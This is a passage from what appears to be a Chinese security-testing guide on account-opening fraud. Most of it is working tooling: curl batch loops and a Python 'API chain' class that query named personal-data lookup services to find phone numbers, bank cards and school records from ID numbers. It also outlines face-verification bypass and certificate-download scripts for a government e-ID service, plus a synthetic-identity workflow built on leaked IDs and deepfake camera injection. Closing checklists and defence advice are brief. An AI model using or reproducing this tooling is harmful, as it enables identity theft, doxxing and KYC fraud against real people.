#### 17.2.3 IP定位

```bash
# === IP地址地理定位 ===
# 端点: http://hpmod.xin/api/sgk/ip定位.php
# 参数: ip=IP地址
# 用途: 获取IP地址的地理位置信息

# 基本查询
curl "http://hpmod.xin/api/sgk/ip定位.php?ip=8.8.8.8"
curl "http://hpmod.xin/api/sgk/ip定位.php?ip=114.114.114.114"

# 批量查询
for ip in $(cat ip_list.txt); do
  curl -s "http://hpmod.xin/api/sgk/ip定位.php?ip=$ip" >> geo_results.txt
done

# 攻击场景:
# 1. 开户风控绕过 — 模拟开户时IP地址与身份证地址在同一城市
# 2. 代理IP验证 — 检测代理IP的地理位置是否匹配目标区域
# 3. 社会工程 — 结合IP定位信息进行精准钓鱼
# 4. 合规测试 — 测试开户系统是否验证IP归属地与身份证地址一致性
# 5. 设备指纹伪造 — 在虚拟环境中伪造与身份匹配的IP地理位置
```

#### 17.2.4 国政模糊常用号

```bash
# === 国政数据模糊查询常用号码 ===
# 端点: http://hpmod.xin/api/sgk/国政模糊常用号.php
# 参数: name=姓名&sfz=身份证
# 用途: 模糊查询与姓名+身份证关联的常用号码（手机号等）

# 基本查询
curl "http://hpmod.xin/api/sgk/国政模糊常用号.php?name=张三&sfz=11010119900101003X"

# 批量查询
while IFS= read -r line; do
  name=$(echo $line | cut -d',' -f1)
  sfz=$(echo $line | cut -d',' -f2)
  curl -s "http://hpmod.xin/api/sgk/国政模糊常用号.php?name=$name&sfz=$sfz" >> phone_results.txt
  sleep 0.5
done < name_id_pairs.txt

# 攻击场景:
# 1. 获取目标手机号 — 用于开户流程中的手机号验证
# 2. 验证合成身份 — 检查生成的身份证号是否关联到真实手机号
# 3. 四要素验证准备 — 收集姓名+身份证+手机号+银行卡的四要素数据
# 4. 社交工程 — 获取目标常用号码用于短信钓鱼
# 5. 批量注册 — 配合接码平台验证手机号是否已被注册
```

#### 17.2.5 单次二要素

```bash
# === 单次二要素验证 ===
# 端点: http://hpmod.xin/api/sgk/单次二要素.php
# 参数: xm=姓名&sfz=身份证
# 用途: 验证姓名+身份证号二要素是否匹配（权威数据源）

# 基本查询
curl "http://hpmod.xin/api/sgk/单次二要素.php?xm=张三&sfz=11010119900101003X"

# 批量验证
while IFS= read -r line; do
  name=$(echo $line | cut -d',' -f1)
  sfz=$(echo $line | cut -d',' -f2)
  result=$(curl -s "http://hpmod.xin/api/sgk/单次二要素.php?xm=$name&sfz=$sfz")
  echo "$name,$sfz,$result" >> verification_results.txt
done < test_identities.txt

# 攻击场景:
# 1. 合成身份验证 — 检查生成的身份证号+姓名是否真实匹配
# 2. 身份信息清洗 — 从数据泄露中筛选出真实有效的身份组合
# 3. 开户系统对比测试 — 测试目标开户系统的二要素验证是否与权威数据一致
# 4. 批量生成合法身份 — 通过二要素接口验证生成的身份证号实用性
# 5. 评估二要素验证接口的速率限制和防滥用机制
```

#### 17.2.6 综合查询

```bash
# === 综合信息查询 ===
# 端点: http://ysjk.6kai.cc/zh2.php
# 参数: cx=查询内容（身份证号/手机号/姓名等）
# 用途: 综合信息查询，涵盖多种数据源

# 基本查询
curl "http://ysjk.6kai.cc/zh2.php?cx=11010119900101003X"
curl "http://ysjk.6kai.cc/zh2.php?cx=张三"
curl "http://ysjk.6kai.cc/zh2.php?cx=13800138000"

# 批量查询
for query in $(cat query_list.txt); do
  curl -s "http://ysjk.6kai.cc/zh2.php?cx=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$query'))")" >> zh_results.txt
  sleep 1
done
```

### 17.3 广西公安电子证件自动化脚本

> 该脚本实现了广西公安电子证件的全自动化申请流程，包括实名认证绕过、
> 人脸验证跳过、短信验证码OCR识别、电子证件下载与账户注销。
> 可作为开户安全测试中"身份验证流程绕过"的实战案例。

```python
# === 广西公安电子证件客户端关键功能 ===
# 文件: tools/account-opening/guangxi_police_cert.py

# 核心功能模块:
# 1. 用户身份核验 (check_user)
# 2. 实名认证绕过 — 跳过腾讯云人脸验证 (get_verifyid_for_register)
# 3. 社交登录 — 微信小程序登录模拟 (social_login)
# 4. 图形验证码OCR自动识别 (ocr_captcha)
# 5. 短信验证码发送 (send_sms_code)
# 6. 用户注册 — 包含手机号+实名绑定 (register_user)
# 7. 电子证件申请/下载 (check_certificate/download_certificate)
# 8. 账户注销 — 注册→使用→注销 完整生命周期 (cancel_account)

# 攻击面分析:
# 1. 实名认证绕过 — 利用验证ID获取接口跳过人脸识别
# 2. 批量注册 — 使用不同身份证号批量注册
# 3. 证件下载 — 获取真实电子证件用于KYC绕过
# 4. 账户注销 — 实现"注册→使用→注销→重新注册"循环

# 一键运行:
# python3 tools/account-opening/guangxi_police_cert.py
# 输入姓名和身份证号即可自动完成整个流程
```

### 17.4 上海健康证查询脚本

> 该脚本实现上海健康证(jkz.sh.cn)的在线查询，需要先逆向前端加密算法。
> 健康证包含姓名、身份证号、联系电话、照片等敏感信息，
> 可用于开户安全测试中的身份信息收集。

```python
# === 上海健康证查询客户端关键功能 ===
# 文件: tools/account-opening/shanghai_health_card.py

# 核心功能模块:
# 1. 验证码获取 (get_captcha)
# 2. 健康证查询 (query_health_card)
# 3. 结果格式化输出 (format_print)

# 攻击面分析:
# 1. 健康证信息泄露 — 姓名+身份证号+联系电话+照片
# 2. 健康证照片可被用于KYC人脸识别绕过
# 3. 联系电话可用于接码平台验证
# 4. 健康证编号可用于某些医疗类平台的开户
```

### 17.5 API链式调用与组合攻击

```python
# === 身份信息查询API链式调用 ===
# 将多条API组合使用，形成完整的信息收集链

import requests
import json
import time
import random

class IdentityQueryAPIChain:
    """身份信息查询API链式调用框架"""
    
    def __init__(self):
        self.base_urls = {
            "jx_xueji": "http://hpmod.xin/api/sgk/江西学籍.php",
            "bank_card": "http://hpmod.xin/api/sgk/卡反模糊位.php",
            "ip_location": "http://hpmod.xin/api/sgk/ip定位.php",
            "guozheng_phone": "http://hpmod.xin/api/sgk/国政模糊常用号.php",
            "two_factor": "http://hpmod.xin/api/sgk/单次二要素.php",
            "zhonghe": "http://ysjk.6kai.cc/zh2.php",
        }
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
    
    def query_jx_xueji(self, id_card):
        """查询江西学籍"""
        try:
            resp = self.session.get(
                self.base_urls["jx_xueji"],
                params={"msg": id_card},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[jx_xueji] Error: {e}")
            return None
    
    def query_bank_card(self, card_no):
        """银行卡反模糊查询"""
        try:
            resp = self.session.get(
                self.base_urls["bank_card"],
                params={"card": card_no},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[bank_card] Error: {e}")
            return None
    
    def query_ip_location(self, ip):
        """IP定位查询"""
        try:
            resp = self.session.get(
                self.base_urls["ip_location"],
                params={"ip": ip},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[ip_location] Error: {e}")
            return None
    
    def query_guozheng_phone(self, name, id_card):
        """国政模糊查询常用号码"""
        try:
            resp = self.session.get(
                self.base_urls["guozheng_phone"],
                params={"name": name, "sfz": id_card},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[guozheng_phone] Error: {e}")
            return None
    
    def verify_two_factor(self, name, id_card):
        """二要素验证"""
        try:
            resp = self.session.get(
                self.base_urls["two_factor"],
                params={"xm": name, "sfz": id_card},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[two_factor] Error: {e}")
            return None
    
    def query_zhonghe(self, query):
        """综合查询"""
        try:
            resp = self.session.get(
                self.base_urls["zhonghe"],
                params={"cx": query},
                timeout=15
            )
            return resp.json() if resp.status_code == 200 else None
        except Exception as e:
            print(f"[zhonghe] Error: {e}")
            return None
    
    def full_identity_chain(self, name, id_card, ip=None):
        """完整身份信息链式查询"""
        results = {}
        
        # 步骤1: 二要素验证（验证身份真实性）
        print("[*] 步骤1: 二要素验证...")
        v2 = self.verify_two_factor(name, id_card)
        results["two_factor"] = v2
        if v2 and v2.get("status") == "match":
            print("[+] 二要素验证通过 - 身份真实")
        else:
            print("[-] 二要素验证失败 - 身份可能不真实")
        
        # 步骤2: 查询关联手机号
        print("[*] 步骤2: 查询关联手机号...")
        phone = self.query_guozheng_phone(name, id_card)
        results["phone"] = phone
        
        # 步骤3: 查询学籍信息
        print("[*] 步骤3: 查询学籍信息...")
        xueji = self.query_jx_xueji(id_card)
        results["xueji"] = xueji
        
        # 步骤4: IP定位（如果提供IP）
        if ip:
            print("[*] 步骤4: IP定位...")
            geo = self.query_ip_location(ip)
            results["geo"] = geo
        
        # 步骤5: 综合查询
        print("[*] 步骤5: 综合查询...")
        zh = self.query_zhonghe(id_card)
        results["zhonghe"] = zh
        
        return results
    
    def batch_identity_validation(self, identity_list, max_workers=5):
        """批量身份验证"""
        import concurrent.futures
        
        def validate_single(identity):
            """验证单个身份"""
            name = identity.get("name")
            id_card = identity.get("id_card")
            if not name or not id_card:
                return {"identity": identity, "valid": False, "error": "missing fields"}
            
            try:
                v2 = self.verify_two_factor(name, id_card)
                phone = self.query_guozheng_phone(name, id_card)
                return {
                    "identity": identity,
                    "valid": bool(v2 and v2.get("status") == "match"),
                    "two_factor": v2,
                    "phone": phone
                }
            except Exception as e:
                return {"identity": identity, "valid": False, "error": str(e)}
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(validate_single, identity_list))
        
        # 筛选有效的身份
        valid_identities = [r for r in results if r.get("valid")]
        print(f"[+] 有效身份: {len(valid_identities)}/{len(identity_list)}")
        return results


# === 使用示例 ===
if __name__ == "__main__":
    chain = IdentityQueryAPIChain()
    
    # 单身份链式查询
    result = chain.full_identity_chain(
        name="张三",
        id_card="11010119900101003X",
        ip="114.114.114.114"
    )
    print(json.dumps(result, ensure_ascii=False, indent=2))
    
    # 批量身份验证
    identities = [
        {"name": "张三", "id_card": "11010119900101003X"},
        {"name": "李四", "id_card": "11010119900101004X"},
        {"name": "王五", "id_card": "11010119900101005X"},
    ]
    batch_results = chain.batch_identity_validation(identities)
```

### 17.6 身份信息查询API在开户攻击中的实战应用

#### 17.6.1 合成身份构建工作流

```
身份信息查询API → 合成身份构建 → 开户系统提交 → 成功开户

阶段1: 数据收集
  1. 从数据泄露/社工库获取一批身份证号
  2. 使用二要素API验证哪些身份证号有效
  3. 使用国政模糊查询获取关联手机号
  4. 使用学籍查询获取教育背景信息

阶段2: 身份合成
  1. 真实身份证号 + 虚构姓名（不在黑名单中）
  2. AI生成的人脸照片（StyleGAN3）
  3. 通过IP定位API选择与身份证地址一致的IP
  4. 虚拟手机号（接码平台）

阶段3: 开户提交
  1. 使用反检测浏览器模拟开户
  2. 虚拟摄像头注入预录制视频
  3. OCR结果篡改提交伪造身份
  4. 银行卡信息使用银行卡反模糊API验证

阶段4: 验证通过
  1. 二要素验证通过（身份证号真实）
  2. 手机号可接收验证码
  3. 人脸识别通过（Deepfake注入）
  4. 银行卡绑定通过（卡号格式正确）
```

#### 17.6.2 开户风控规则探测

```python
# === 使用身份查询API探测开户风控规则 ===

def probe_risk_rules(target_api, test_identities):
    """
    通过批量测试不同身份组合，探测开户系统的风控规则
    
    测试维度:
    - 同一身份证号+不同手机号 → 是否允许重复注册
    - 同一手机号+不同身份证号 → 是否允许
    - 同一IP+不同身份 → 有无频率限制
    - 不同IP+同一身份 → 是否触发异地登录风控
    - 虚拟运营商号段 → 是否被拦截
    - 国外IP → 是否被限制
    """
    results = []
    for identity in test_identities:
        result = {
            "identity": identity,
            "ip_location": self.query_ip_location(identity["ip"]),
            "two_factor_valid": self.verify_two_factor(identity["name"], identity["id_card"]),
            "registration_result": self.attempt_registration(target_api, identity),
        }
        # 分析风控规则
        if result["registration_result"].get("success"):
            result["risk_rule"] = "PASSED"
        elif "phone" in str(result["registration_result"]):
            result["risk_rule"] = "PHONE_BLOCKED"
        elif "ip" in str(result["registration_result"]):
            result["risk_rule"] = "IP_BLOCKED"
        elif "face" in str(result["registration_result"]):
            result["risk_rule"] = "FACE_LIVENESS_BLOCKED"
        else:
            result["risk_rule"] = "UNKNOWN"
        results.append(result)
    return results
```

#### 17.6.3 身份信息溯源与反查

```python
# === 身份信息溯源 ===
# 场景: 已知目标手机号/银行卡号，反查身份信息

def reverse_lookup(phone=None, bank_card=None, ip=None):
    """身份信息反查"""
    chain = IdentityQueryAPIChain()
    results = {}
    
    # 1. 手机号反查
    if phone:
        # 使用综合查询API反查手机号关联的身份信息
        zh = chain.query_zhonghe(phone)
        results["phone_lookup"] = zh
    
    # 2. 银行卡号反查
    if bank_card:
        # 使用银行卡反模糊API查询银行卡信息
        bank = chain.query_bank_card(bank_card)
        results["bank_lookup"] = bank
    
    # 3. IP溯源
    if ip:
        # 使用IP定位API查询地理位置
        geo = chain.query_ip_location(ip)
        results["geo_lookup"] = geo
    
    return results
```

### 17.7 安全测试检查点

```markdown
□ [ ] 身份信息查询API:
  □ [ ] 测试二要素验证接口的速率限制
  □ [ ] 测试国政模糊查询接口的防滥用机制
  □ [ ] 测试银行卡反模糊接口的卡号段覆盖范围
  □ [ ] 测试IP定位接口的精度和时延
  □ [ ] 测试综合查询接口的参数注入漏洞
  □ [ ] 测试API接口的认证/授权机制

□ [ ] 政府服务自动化脚本:
  □ [ ] 测试电子证件申请流程的身份验证强度
  □ [ ] 测试人脸识别绕过是否可被检测
  □ [ ] 测试OCR验证码识别是否可被防御
  □ [ ] 测试批量注册是否存在频率限制
  □ [ ] 测试账户注销后数据是否彻底清除

□ [ ] 合成身份检测:
  □ [ ] 是否检测二要素验证结果的时间一致性
  □ [ ] 是否检测身份证号对应的手机号归属地
  □ [ ] 是否交叉验证多个数据源的身份信息
  □ [ ] 是否检测IP地址与身份证地址的合理性
  □ [ ] 是否建立身份信息使用的历史基线
```

### 17.8 2026年身份查询API攻击趋势

```python
# === 2026年身份信息查询API攻击新趋势 ===

# 1. API聚合平台
# 2026年出现大量身份信息查询API聚合平台
# 类似hpmod.xin/ysjk.6kai.cc的代理API越来越多
# 攻击者: 利用聚合API批量查询，获取360°身份信息
# 防御: 检测API调用模式，识别批量查询行为

# 2. AI辅助身份信息关联
# 使用LLM自动关联多个API查询结果
# 构建完整的身份信息图谱
# 识别跨平台身份复用

# 3. 实时身份验证API
# 越来越多的开户系统接入实时身份验证API
# 攻击面: 中间人攻击篡改验证结果
# 攻击面: API降级攻击（实时→离线）
# 攻击面: 并发验证绕过（竞态条件）

# 4. 合成身份生命周期管理
# 2026年黑产使用自动化工具管理合成身份
# 创建→验证→休眠→使用→废弃 全生命周期
# 身份查询API用于验证阶段
# 防御: 检测身份信息的异常使用模式

# 5. 跨平台身份关联检测
# 同一身份信息在多个平台的使用
# 开户系统应检测: 
# - 同一身份证号在不同平台的开户记录
# - 同一手机号在不同平台的注册记录
# - 同一设备指纹的开户行为
# 攻击者: 使用不同的身份信息组合避免关联
```

### 17.9 防御建议

```markdown
1. 身份查询API保护:
   - 实施严格的速率限制（每IP/每分钟不超过N次查询）
   - 实施API Key认证机制
   - 检测异常查询模式（批量查询/高频查询）
   - 对查询结果进行脱敏处理

2. 开户系统防御:
   - 不要仅依赖二要素验证
   - 实施多源交叉验证（多个数据源对比）
   - 检测查询时间窗口（短时间内大量查询=风险信号）
   - 建立身份信息使用历史基线
   - 对异常身份信息组合进行标记

3. 风控规则:
   - 同一身份证号短时间内在不同平台开户 → 风险标记
   - 同一手机号绑定多个身份证号 → 风险标记
   - 使用虚拟运营商号段 → 加强验证
   - IP地址与身份证地址跨省/跨国 → 加强验证
   - 身份信息查询API调用频率异常 → 风控升级
```